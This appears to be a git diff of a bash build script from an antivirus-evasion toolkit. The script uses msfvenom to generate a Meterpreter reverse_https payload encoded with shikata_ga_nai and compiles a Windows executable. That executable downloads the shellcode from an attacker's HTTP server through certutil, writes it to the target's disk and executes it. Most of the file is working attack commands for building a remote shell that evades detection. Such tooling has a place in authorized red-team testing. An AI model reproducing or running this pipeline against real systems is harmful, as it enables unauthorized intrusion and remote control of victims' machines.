@@ -1,10 +1,22 @@
 #!/bin/bash          
-# build the .exe file that loads the payload from a given text file
+# Apply shikata, download your payload via certutil.
+
+# The generated msf payload needs to be hosted on a HTTP server
+# Call your payload like:
+# output.exe http://myserver/thepayload.bin
+# The executable will download and drop the payload as a file on the target's disk.
+# It will then execute the shellcode given in the file.
+
+# print AVET logo
+cat banner.txt
 
 # include script containing the compiler var $win32_compiler
 # you can edit the compiler in build/global_win32.sh
 # or enter $win32_compiler="mycompiler" here
 . build/global_win32.sh
+
+# import feature construction interface
+. build/feature_construction.sh
 
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
@@ -15,20 +27,33 @@ LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload, encoded with shikata_ga_nai
 # additionaly to the avet encoder, further encoding should be used
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 -b "\x00" --platform Windows > thepayload.bin
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f raw -a x86 -b "\x00" --platform Windows > output/thepayload.bin
 
-# copy file to standart web server dir
-cp thepayload.bin /var/www/html
+# set shellcode source
+set_payload_source download_certutil
 
-# call make_avet, the -l stands for loading and exec shellcode from given file 
-# -d certutil downloads the file from a url, -q hides window
-./make_avet -l -d certutil 
+# set decoder and key source
+set_decoder none
+set_key_source none
 
-# compile to pwn.exe file
-$win32_compiler -o pwn.exe avet.c
-strip pwn.exe
+# set payload info source
+set_payload_info_source none
+
+# set shellcode binding technique
+set_payload_execution_method exec_shellcode
+
+# enable debug output
+enable_debug_print
+
+# compile to output.exe file
+$win32_compiler -o output/output.exe source/avet.c
+strip output/output.exe
 
 # cleanup
-echo "" > defs.h
+cleanup_techniques
 
-# call your programm with pwn.exe thepayload.bin http://myserver/thepayload.bin 
+# The generated msf payload needs to be hosted on a HTTP server
+# Call your payload like:
+# output.exe http://myserver/thepayload.bin
+# The executable will download and drop the payload as a file "thepayload.bin" on the target's disk.
+# It will then execute the shellcode given in the file.
